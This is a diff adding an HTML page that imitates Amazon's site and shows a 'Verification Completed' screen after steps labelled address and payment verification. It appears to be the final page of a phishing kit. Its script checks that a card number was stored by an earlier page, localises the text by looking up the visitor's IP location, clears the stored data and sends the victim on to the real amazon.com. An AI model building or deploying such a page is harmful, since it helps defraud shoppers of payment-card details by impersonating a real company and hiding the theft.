@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Completed</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
+        body { background: #ffffff; min-height: 100vh; display: flex; flex-direction: column; }
+        
+        /* === HEADER === */
+        .header-top { background: #131921; padding: 6px 20px; display: flex; align-items: center; justify-content: space-between; color: #fff; font-size: 13px; }
+        .logo { font-size: 24px; font-weight: 700; color: #fff; text-decoration: none; margin-right: 20px; }
+        .header-kiri { display: flex; align-items: center; }
+        .deliver-to { display: flex; align-items: center; gap: 6px; margin-right: 20px; }
+        .search-bar { display: flex; flex: 1; max-width: 600px; }
+        .search-bar select { border: none; border-radius: 4px 0 0 4px; padding: 6px; background: #f3f3f3; }
+        .search-bar input { flex: 1; border: none; padding: 7px 10px; outline: none; }
+        .search-btn { background: #febd69; border: none; padding: 7px 14px; border-radius: 0 4px 4px 0; cursor: pointer; }
+        .header-kanan { display: flex; align-items: center; gap: 25px; }
+        .header-kanan a { color: #fff; text-decoration: none; }
+        
+        .nav-bar { background: #232f3e; padding: 6px 20px; }
+        .nav-links { display: flex; gap: 20px; }
+        .nav-links a { color: #fff; font-size: 13px; text-decoration: none; }
+        
+        /* === PROGRESS STEP === */
+        .progress-container { max-width: 600px; margin: 40px auto 30px; padding: 0 20px; }
+        .progress-langkah { display: flex; justify-content: space-between; position: relative; }
+        .progress-langkah::before { content: ''; position: absolute; top: 14px; left: 12%; right: 12%; height: 2px; background: #067d62; }
+        .langkah { text-align: center; position: relative; z-index: 1; width: 33%; }
+        .nomor { width: 28px; height: 28px; border-radius: 50%; background: #067d62; color: #fff; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; font-weight: 600; margin-bottom: 4px; }
+        .teks { font-size: 13px; color: #067d62; font-weight: 500; }
+        
+        /* === KOTAK UTAMA === */
+        .wadah { max-width: 580px; margin: 0 auto 60px; padding: 0 20px; }
+        .kotak-sukses { border: 1px solid #067d62; border-radius: 8px; padding: 20px 25px; border-left: 4px solid #067d62; }
+        .judul-sukses { font-size: 18px; font-weight: 600; color: #067d62; margin-bottom: 12px; display: flex; align-items: center; gap: 8px; }
+        .isi-sukses { font-size: 14px; color: #333; line-height: 1.6; padding-left: 26px; }
+        .isi-sukses p { margin-bottom: 4px; }
+        
+        .back-top { text-align: center; padding: 15px; border-top: 1px solid #e7e7e7; font-size: 12px; color: #555; cursor: pointer; margin: 20px 0; }
+        
+        /* === FOOTER === */
+        .footer { background: #232f3e; color: #fff; padding: 40px 20px 20px; }
+        .footer-inner { max-width: 1000px; margin: 0 auto; display: grid; grid-template-columns: repeat(4, 1fr); gap: 30px; margin-bottom: 30px; }
+        .footer h4 { font-size: 14px; margin-bottom: 12px; }
+        .footer a { display: block; color: #ddd; font-size: 12px; text-decoration: none; margin-bottom: 6px; }
+        .footer a:hover { text-decoration: underline; }
+        .footer-bawah { text-align: center; padding-top: 20px; border-top: 1px solid #3a4553; font-size: 12px; color: #aaa; }
+        .footer-bawah .logo-bawah { margin: 10px 0; }
+        .pilihan-bawah { display: flex; justify-content: center; gap: 15px; margin: 10px 0; }
+        .pilihan-bawah select { padding: 4px 8px; border-radius: 4px; border: 1px solid #555; background: transparent; color: #fff; font-size: 12px; }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <div class="header-top">
+        <div class="header-kiri">
+            <a href="#" class="logo">amazon</a>
+            <div class="deliver-to">
+                <span>📍</span>
+                <div>
+                    <div style="font-size:11px; color:#ccc;">Deliver to</div>
+                    <div style="font-weight:bold;" id="deliverNegara">Indonesia</div>
+                </div>
+            </div>
+            <div class="search-bar">
+                <select>
+                    <option>All</option>
+                </select>
+                <input type="text" placeholder="Search Amazon">
+                <button class="search-btn">🔍</button>
+            </div>
+        </div>
+        <div class="header-kanan">
+            <a href="#">Hello, ID</a>
+            <a href="#">Account Lists</a>
+            <a href="#">Returns<br><b>& Orders</b></a>
+            <a href="#">🛒 Cart</a>
+        </div>
+    </div>
+    <div class="nav-bar">
+        <div class="nav-links">
+            <a href="#">☰ All</a>
+            <a href="#">🔴 Rufus</a>
+            <a href="#">Today's Deals</a>
+            <a href="#">Prime Video</a>
+            <a href="#">Buy Again</a>
+            <a href="#">Customer Service</a>
+            <a href="#">Registry</a>
+            <a href="#">Gift Cards</a>
+            <a href="#">Sell</a>
+        </div>
+    </div>
+
+    <!-- PROGRESS STEP -->
+    <div class="progress-container">
+        <div class="progress-langkah">
+            <div class="langkah">
+                <div class="nomor">✓</div>
+                <div class="teks" id="langkah1Teks">Verify Address</div>
+            </div>
+            <div class="langkah">
+                <div class="nomor">✓</div>
+                <div class="teks" id="langkah2Teks">Verify Payment</div>
+            </div>
+            <div class="langkah">
+                <div class="nomor">✓</div>
+                <div class="teks" id="langkah3Teks">Complete</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- KOTAK UTAMA -->
+    <div class="wadah">
+        <div class="kotak-sukses">
+            <h2 class="judul-sukses">✓ <span id="judulSukses">Your Verification Completed</span></h2>
+            <div class="isi-sukses">
+                <p>• <span id="pesanSukses">We will notify you via email message as soon as your account will be verified.</span></p>
+            </div>
+        </div>
+    </div>
+
+    <div class="back-top" id="kembaliKeAtas">Back to top</div>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <div class="footer-inner">
+            <div>
+                <h4 id="judulKenalKami">Get to Know Us</h4>
+                <a href="#" id="linkKarir">Careers</a>
+                <a href="#" id="linkBlog">Blog</a>
+                <a href="#" id="linkTentang">About Amazon</a>
+                <a href="#" id="linkInvestor">Investor Relations</a>
+                <a href="#" id="linkPerangkat">Amazon Devices</a>
+                <a href="#" id="linkSains">Amazon Science</a>
+            </div>
+            <div>
+                <h4 id="judulHasilkan">Make Money with Us</h4>
+                <a href="#" id="linkJualProduk">Sell products on Amazon</a>
+                <a href="#" id="linkJualBisnis">Sell on Amazon Business</a>
+                <a href="#" id="linkJualAplikasi">Sell apps on Amazon</a>
+                <a href="#" id="linkAfiliasi">Become an Affiliate</a>
+                <a href="#" id="linkIklan">Advertise Your Products</a>
+                <a href="#" id="linkPublikasi">Self-Publish with Us</a>
+                <a href="#" id="linkTuanRumah">Host an Amazon Hub</a>
+                <a href="#" id="linkLainnya">› See More Make Money with Us</a>
+            </div>
+            <div>
+                <h4 id="judulProdukBayar">Amazon Payment Products</h4>
+                <a href="#" id="linkKartuBisnis">Amazon Business Card</a>
+                <a href="#" id="linkPoin">Shop with Points</a>
+                <a href="#" id="linkIsiUlang">Reload Your Balance</a>
+                <a href="#" id="linkKonverter">Amazon Currency Converter</a>
+            </div>
+            <div>
+                <h4 id="judulBantu">Let Us Help You</h4>
+                <a href="#" id="linkAkun">Your Account</a>
+                <a href="#" id="linkPesanan">Your Orders</a>
+                <a href="#" id="linkPengiriman">Shipping Rates & Policies</a>
+                <a href="#" id="linkPengembalian">Returns & Replacements</a>
+                <a href="#" id="linkKelola">Manage Your Content and Devices</a>
+                <a href="#" id="linkBantuan">Help</a>
+            </div>
+        </div>
+
+        <div class="footer-bawah">
+            <div class="logo-bawah">amazon</div>
+            <div class="pilihan-bawah">
+                <select id="pilihBahasa">
+                    <option value="en">English</option>
+                    <option value="id">Bahasa Indonesia</option>
+                    <option value="ja">日本語</option>
+                    <option value="zh">中文</option>
+                    <option value="th">ไทย</option>
+                </select>
+                <select id="pilihMataUang">
+                    <option>USD - U.S. Dollar</option>
+                </select>
+                <select id="pilihNegara">
+                    <option>Indonesia</option>
+                </select>
+            </div>
+            <p style="margin-top:15px;">
+                <a href="#" style="color:#aaa;">Conditions of Use</a>
+                <a href="#" style="color:#aaa; margin:0 10px;">Consumer Health Data Privacy Disclosure</a>
+                <a href="#" style="color:#aaa;">Your Ads Privacy Choices</a>
+                <a href="#" style="color:#aaa; margin:0 10px;">Privacy Notice</a>
+            </p>
+            <p style="margin-top:5px;">&copy; 1996-2026, Amazon.com, Inc. or its affiliates</p>
+        </div>
+    </div>
+
+<script>
+// === TERJEMAHAN ===
+const terjemahan = {
+  en: {
+    langkah1:'Verify Address', langkah2:'Verify Payment', langkah3:'Complete',
+    judulSukses:'Your Verification Completed',
+    pesanSukses:'We will notify you via email message as soon as your account will be verified.',
+    kembaliKeAtas:'Back to top',
+    judulKenalKami:'Get to Know Us', linkKarir:'Careers', linkBlog:'Blog', linkTentang:'About Amazon',
+    linkInvestor:'Investor Relations', linkPerangkat:'Amazon Devices', linkSains:'Amazon Science',
+    judulHasilkan:'Make Money with Us', linkJualProduk:'Sell products on Amazon',
+    linkJualBisnis:'Sell on Amazon Business', linkJualAplikasi:'Sell apps on Amazon',
+    linkAfiliasi:'Become an Affiliate', linkIklan:'Advertise Your Products',
+    linkPublikasi:'Self-Publish with Us', linkTuanRumah:'Host an Amazon Hub',
+    linkLainnya:'› See More Make Money with Us',
+    judulProdukBayar:'Amazon Payment Products', linkKartuBisnis:'Amazon Business Card',
+    linkPoin:'Shop with Points', linkIsiUlang:'Reload Your Balance', linkKonverter:'Amazon Currency Converter',
+    judulBantu:'Let Us Help You', linkAkun:'Your Account', linkPesanan:'Your Orders',
+    linkPengiriman:'Shipping Rates & Policies', linkPengembalian:'Returns & Replacements',
+    linkKelola:'Manage Your Content and Devices', linkBantuan:'Help'
+  },
+  id: {
+    langkah1:'Verifikasi Alamat', langkah2:'Verifikasi Pembayaran', langkah3:'Selesai',
+    judulSukses:'Verifikasi Anda Telah Selesai',
+    pesanSukses:'Kami akan mengirimkan pemberitahuan melalui email segera setelah akun Anda diverifikasi.',
+    kembaliKeAtas:'Kembali ke atas',
+    judulKenalKami:'Kenali Kami', linkKarir:'Karir', linkBlog:'Blog', linkTentang:'Tentang Amazon',
+    linkInvestor:'Hubungan Investor', linkPerangkat:'Perangkat Amazon', linkSains:'Sains Amazon',
+    judulHasilkan:'Cara Menghasilkan Uang', linkJualProduk:'Jual Produk di Amazon',
+    linkJualBisnis:'Jual di Amazon Bisnis', linkJualAplikasi:'Jual Aplikasi di Amazon',
+    linkAfiliasi:'Jadi Afiliasi', linkIklan:'Pasang Iklan',
+    linkPublikasi:'Penerbitan Mandiri', linkTuanRumah:'Jadi Tuan Rumah',
+    linkLainnya:'› Lihat Lebih Banyak',
+    judulProdukBayar:'Produk Pembayaran', linkKartuBisnis:'Kartu Bisnis Amazon',
+    linkPoin:'Belanja Poin', linkIsiUlang:'Isi Ulang Saldo', linkKonverter:'Konverter Mata Uang',
+    judulBantu:'Bantuan', linkAkun:'Akun Saya', linkPesanan:'Pesanan Saya',
+    linkPengiriman:'Biaya & Kebijakan Pengiriman', linkPengembalian:'Pengembalian',
+    linkKelola:'Kelola Perangkat', linkBantuan:'Bantuan'
+  },
+  ja: {
+    langkah1:'住所確認', langkah2:'お支払い確認', langkah3:'完了',
+    judulSukses:'確認が完了しました',
+    pesanSukses:'アカウント確認が完了次第、メールでお知らせいたします。',
+    kembaliKeAtas:'ページ上部へ',
+    judulKenalKami:'Amazonについて', linkKarir:'採用情報', linkBlog:'ブログ', linkTentang:'Amazonについて',
+    linkInvestor:'投資家情報', linkPerangkat:'Amazonデバイス', linkSains:'Amazonサイエンス',
+    judulHasilkan:'Amazonで稼ぐ', linkJualProduk:'商品を売る',
+    linkJualBisnis:'事業者向け', linkJualAplikasi:'アプリを売る',
+    linkAfiliasi:'アフィリエイト', linkIklan:'広告掲載',
+    linkPublikasi:'自費出版', linkTuanRumah:'ホストになる',
+    linkLainnya:'› その他',
+    judulProdukBayar:'お支払い', linkKartuBisnis:'ビジネスカード',
+    linkPoin:'ポイント利用', linkIsiUlang:'残高チャージ', linkKonverter:'通貨換算',
+    judulBantu:'サポート', linkAkun:'アカウント', linkPesanan:'注文履歴',
+    linkPengiriman:'配送料・規約', linkPengembalian:'返品・交換',
+    linkKelola:'コンテンツ管理', linkBantuan:'ヘルプ'
+  },
+  zh: {
+    langkah1:'验证地址', langkah2:'验证付款', langkah3:'完成',
+    judulSukses:'验证已完成',
+    pesanSukses:'账户验证完成后，我们将通过邮件通知您。',
+    kembaliKeAtas:'回到顶部',
+    judulKenalKami:'了解我们', linkKarir:'招聘', linkBlog:'博客', linkTentang:'关于我们',
+    linkInvestor:'投资者关系', linkPerangkat:'设备', linkSains:'亚马逊科学',
+    judulHasilkan:'赚钱', linkJualProduk:'开店',
+    linkJualBisnis:'企业采购', linkJualAplikasi:'开发应用',
+    linkAfiliasi:'联盟营销', linkIklan:'广告服务',
+    linkPublikasi:'自助出版', linkTuanRumah:'合作',
+    linkLainnya:'› 更多',
+    judulProdukBayar:'支付产品', linkKartuBisnis:'企业卡',
+    linkPoin:'积分商城', linkIsiUlang:'账户充值', linkKonverter:'汇率换算',
+    judulBantu:'帮助中心', linkAkun:'我的账户', linkPesanan:'我的订单',
+    linkPengiriman:'配送政策', linkPengembalian:'退换货',
+    linkKelola:'内容管理', linkBantuan:'帮助'
+  },
+  th: {
+    langkah1:'ตรวจสอบที่อยู่', langkah2:'ตรวจสอบการชำระเงิน', langkah3:'เสร็จสิ้น',
+    judulSukses:'การยืนยันเสร็จสมบูรณ์',
+    pesanSukses:'เราจะแจ้งให้ทราบทางอีเมลเมื่อบัญชีได้รับการยืนยัน',
+    kembaliKeAtas:'กลับด้านบน',
+    judulKenalKami:'รู้จักเรา', linkKarir:'ร่วมงาน', linkBlog:'บล็อก', linkTentang:'เกี่ยวกับเรา',
+    linkInvestor:'นักลงทุน', linkPerangkat:'อุปกรณ์', linkSains:'วิทยาศาสตร์',
+    judulHasilkan:'สร้างรายได้', linkJualProduk:'เปิดร้าน',
+    linkJualBisnis:'ธุรกิจ', linkJualAplikasi:'ขายแอป',
+    linkAfiliasi:'สมาชิก', linkIklan:'โฆษณา',
+    linkPublikasi:'เผยแพร่', linkTuanRumah:'เป็นเจ้าภาพ',
+    linkLainnya:'› เพิ่มเติม',
+    judulProdukBayar:'การชำระเงิน', linkKartuBisnis:'บัตรธุรกิจ',
+    linkPoin:'แลกคะแนน', linkIsiUlang:'เติมเงิน', linkKonverter:'แปลงสกุลเงิน',
+    judulBantu:'ช่วยเหลือ', linkAkun:'บัญชี', linkPesanan:'คำสั่งซื้อ',
+    linkPengiriman:'การจัดส่ง', linkPengembalian:'คืนสินค้า',
+    linkKelola:'จัดการเนื้อหา', linkBantuan:'ช่วยเหลือ'
+  }
+};
+
+// === DETEKSI BAHASA & NEGARA ===
+async function deteksiLokasi() {
+  let kodeNegara = 'ID', namaNegara = 'Indonesia', kodeBahasa = 'id';
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const d = await res.json();
+    kodeNegara = d.country_code || 'ID';
+    namaNegara = d.country_name || 'Indonesia';
+    if (['JP'].includes(kodeNegara)) kodeBahasa = 'ja';
+    else if (['CN'].includes(kodeNegara)) kodeBahasa = 'zh';
+    else if (['TH'].includes(kodeNegara)) kodeBahasa = 'th';
+    else if (['ID'].includes(kodeNegara)) kodeBahasa = 'id';
+    else kodeBahasa = 'en';
+  } catch {
+    kodeBahasa = navigator.language.startsWith('ja') ? 'ja' :
+                  navigator.language.startsWith('zh') ? 'zh' :
+                  navigator.language.startsWith('th') ? 'th' :
+                  navigator.language.startsWith('id') ? 'id' : 'en';
+  }
+  return { kodeBahasa, namaNegara };
+}
+
+function terapkanBahasa(kode) {
+  const t = terjemahan[kode] || terjemahan.en;
+  document.getElementById('langkah1Teks').textContent = t.langkah1;
+  document.getElementById('langkah2Teks').textContent = t.langkah2;
+  document.getElementById('langkah3Teks').textContent = t.langkah3;
+  document.getElementById('judulSukses').textContent = t.judulSukses;
+  document.getElementById('pesanSukses').textContent = t.pesanSukses;
+  document.getElementById('kembaliKeAtas').textContent = t.kembaliKeAtas;
+  
+  // Footer
+  document.getElementById('judulKenalKami').textContent = t.judulKenalKami;
+  document.getElementById('linkKarir').textContent = t.linkKarir;
+  document.getElementById('linkBlog').textContent = t.linkBlog;
+  document.getElementById('linkTentang').textContent = t.linkTentang;
+  document.getElementById('linkInvestor').textContent = t.linkInvestor;
+  document.getElementById('linkPerangkat').textContent = t.linkPerangkat;
+  document.getElementById('linkSains').textContent = t.linkSains;
+  
+  document.getElementById('judulHasilkan').textContent = t.judulHasilkan;
+  document.getElementById('linkJualProduk').textContent = t.linkJualProduk;
+  document.getElementById('linkJualBisnis').textContent = t.linkJualBisnis;
+  document.getElementById('linkJualAplikasi').textContent = t.linkJualAplikasi;
+  document.getElementById('linkAfiliasi').textContent = t.linkAfiliasi;
+  document.getElementById('linkIklan').textContent = t.linkIklan;
+  document.getElementById('linkPublikasi').textContent = t.linkPublikasi;
+  document.getElementById('linkTuanRumah').textContent = t.linkTuanRumah;
+  document.getElementById('linkLainnya').textContent = t.linkLainnya;
+  
+  document.getElementById('judulProdukBayar').textContent = t.judulProdukBayar;
+  document.getElementById('linkKartuBisnis').textContent = t.linkKartuBisnis;
+  document.getElementById('linkPoin').textContent = t.linkPoin;
+  document.getElementById('linkIsiUlang').textContent = t.linkIsiUlang;
+  document.getElementById('linkKonverter').textContent = t.linkKonverter;
+  
+  document.getElementById('judulBantu').textContent = t.judulBantu;
+  document.getElementById('linkAkun').textContent = t.linkAkun;
+  document.getElementById('linkPesanan').textContent = t.linkPesanan;
+  document.getElementById('linkPengiriman').textContent = t.linkPengiriman;
+  document.getElementById('linkPengembalian').textContent = t.linkPengembalian;
+  document.getElementById('linkKelola').textContent = t.linkKelola;
+  document.getElementById('linkBantuan').textContent = t.linkBantuan;
+  
+  // Pilih bahasa sesuai deteksi
+  document.getElementById('pilihBahasa').value = kode;
+}
+
+document.addEventListener('DOMContentLoaded', async () => {
+  // Cek apakah sudah lewat tahap sebelumnya
+  if (!localStorage.getItem('nomor_kartu')) { window.location.href = 'amazon.html'; return; }
+  
+  const lokasi = await deteksiLokasi();
+  terapkanBahasa(lokasi.kodeBahasa);
+  document.getElementById('deliverNegara').textContent = lokasi.namaNegara;
+  
+  // Hapus data sesi setelah selesai
+  setTimeout(() => {
+    localStorage.clear();
+    // Alihkan ke Amazon setelah 5 detik
+    setTimeout(() => {
+      window.location.href = 'https://www.amazon.com';
+    }, 5000);
+  }, 100);
+});
+
+// Kembali ke atas
+document.getElementById('kembaliKeAtas').addEventListener('click', () => {
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+});
+</script>
+</body>
+</html>
